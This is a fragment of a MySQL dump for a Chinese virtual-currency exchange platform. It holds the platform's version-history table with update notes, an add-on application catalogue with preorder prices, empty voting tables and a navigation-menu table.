INSERT INTO `movesay_version` VALUES ('2.5.1', '10029', '模板更新  更新之后在扩展里面主题设置一下 不然前台打不开不了', '1467685524', '1467713145', '支持客服代码定制\r\n扩展里面增加模板切换支持定制\r\n设置其他设置里面取消模板切换\r\n优化应用管理支持新应用预定\r\n优化用户管理搜索用户名不能用\r\n优化后台提现不能导出选中\r\n优化认购详情界面换成币种图标\r\n\r\n\r\n\r\n\r\n\r\n', 'http://os.movesay.com/Auth/upFile/version/2.5.1', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.2', '10030', '优化超级管理员功能', '1467714463', '1467714482', '优化只有超级管理员才能看到升级提示\r\n优化只有超级管理员才能升级系统\r\n优化只有超级管理员才能切换模板\r\n优化只有超级管理员才能切换客服代码\r\n', 'http://os.movesay.com/Auth/upFile/version/2.5.2', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.3', '10031', '更新底部和文章部分', '1467785561', '1467789262', '更新底部新样式\r\n更新文章部分具体效果可以看我们的演示网站\r\n优化首页文章部分\r\n优化交易中心拉100%不能交易\r\n优化后台撤销有时候会出现失败', 'http://os.movesay.com/Auth/upFile/version/2.5.3', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.4', '10032', '优化文章时间文字', '1467795268', '1467795306', '优化文章时间不能修改的问题', 'http://os.movesay.com/Auth/upFile/version/2.5.4', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.5', '10033', '优化后台核心', '1467856087', '1467856102', '优化后台核心', 'http://os.movesay.com/Auth/upFile/version/2.5.5', '0', '0');
INSERT INTO `movesay_version` VALUES ('2.5.6', '10034', '升级系统文件部分过期的问题', '1469073091', '1469074318', '升级系统文件部分过期的问题', 'http://os.movesay.com/Auth/upFile/version/2.5.6', '0', '0');

-- ----------------------------
-- Table structure for movesay_version_game
-- ----------------------------
DROP TABLE IF EXISTS `movesay_version_game`;
CREATE TABLE `movesay_version_game` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `gongsi` varchar(200) COLLATE utf8_unicode_ci NOT NULL COMMENT '名称',
  `shuoming` varchar(200) COLLATE utf8_unicode_ci NOT NULL COMMENT '名称',
  `class` varchar(200) COLLATE utf8_unicode_ci NOT NULL COMMENT '名称',
  `name` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `title` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `number` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci ROW_FORMAT=DYNAMIC COMMENT='应用管理表';

-- ----------------------------
-- Records of movesay_version_game
-- ----------------------------
INSERT INTO `movesay_version_game` VALUES ('1', '武汉动说科技有限公司', '支持虚拟币的购物商城', '#F1AB0F', 'shop', '云购商城', '1');
INSERT INTO `movesay_version_game` VALUES ('2', '武汉动说科技有限公司', '支持对用户进行持币比例分红', '#C53CE7', 'fenhong', '分红中心', '1');
INSERT INTO `movesay_version_game` VALUES ('3', '武汉动说科技有限公司', '支持用虚拟币充值手机话费', '#428bca', 'huafei', '话费充值', '1');
INSERT INTO `movesay_version_game` VALUES ('4', '武汉动说科技有限公司', '可以发行虚拟币让用户认购', '#e74c3c', 'issue', '认购中心', '1');
INSERT INTO `movesay_version_game` VALUES ('5', '武汉动说科技有限公司', '可以对要生效的新币进行投票', '#1abc9c', 'vote', '新币投票', '1');
INSERT INTO `movesay_version_game` VALUES ('6', '武汉动说科技有限公司', '存币涨利息类型于存在钱到银行涨利息', '#f1c40f', 'money', '理财中心', '1');
INSERT INTO `movesay_version_game` VALUES ('7', '武汉动说科技有限公司', '支持单对单交易', '#3c763d', 'bazaar', '集市交易', '0');
INSERT INTO `movesay_version_game` VALUES ('8', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价3000元</span>', '', 'pool', '矿机工厂', '0');
INSERT INTO `movesay_version_game` VALUES ('9', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价3000元</span>', '', 'crowd', '众筹中心', '0');
INSERT INTO `movesay_version_game` VALUES ('10', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价2000元</span>', '', 'qiandao', '签到功能', '0');
INSERT INTO `movesay_version_game` VALUES ('11', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价2000元</span>', '', 'hongbao', '人人红包', '0');
INSERT INTO `movesay_version_game` VALUES ('12', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价3000元</span>', '', 'weike', '威客任务', '0');
INSERT INTO `movesay_version_game` VALUES ('13', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价2000元</span>', '', 'duihuan', '币币兑换', '0');
INSERT INTO `movesay_version_game` VALUES ('14', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价2000元</span>', '', 'shoujiang', '幸运抽奖', '0');
INSERT INTO `movesay_version_game` VALUES ('15', '武汉动说科技有限公司', '<span style=\"color: #e74c3c;\">支持预定(8折优惠)原价3000元</span>', '', 'duobao', '一元夺宝', '0');

-- ----------------------------
-- Table structure for movesay_vote
-- ----------------------------
DROP TABLE IF EXISTS `movesay_vote`;
CREATE TABLE `movesay_vote` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `type` int(20) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `type` (`type`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_vote
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_vote_type
-- ----------------------------
DROP TABLE IF EXISTS `movesay_vote_type`;
CREATE TABLE `movesay_vote_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_vote_type
-- ----------------------------

-- ----------------------------
-- Table structure for qq3479015851_daohang
-- ----------------------------
DROP TABLE IF EXISTS `qq3479015851_daohang`;
CREATE TABLE `qq3479015851_daohang` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(255) NOT NULL COMMENT '名称',
  `title` varchar(255) NOT NULL COMMENT '名称',
  `url` varchar(255) NOT NULL COMMENT 'url',
  `sort` int(11) unsigned NOT NULL COMMENT '排序',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `endtime` int(11) unsigned NOT NULL COMMENT '编辑时间',
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=gbk;

-- ----------------------------
-- Records of qq3479015851_daohang
-- ----------------------------
INSERT INTO `qq3479015851_daohang` VALUES ('1', 'finance', '财务中心', 'Finance/index', '1', '0', '0', '1');
INSERT INTO `qq3479015851_daohang` VALUES ('2', 'user', '安全中心', 'User/index', '2', '0', '0', '1');
INSERT INTO `qq3479015851_daohang` VALUES ('3', 'game', '应用中心', 'Game/index', '3', '0', '0', '1');
INSERT INTO `qq3479015851_daohang` VALUES ('4', 'article', '帮助中心', 'Article/index', '4', '0', '0', '1');
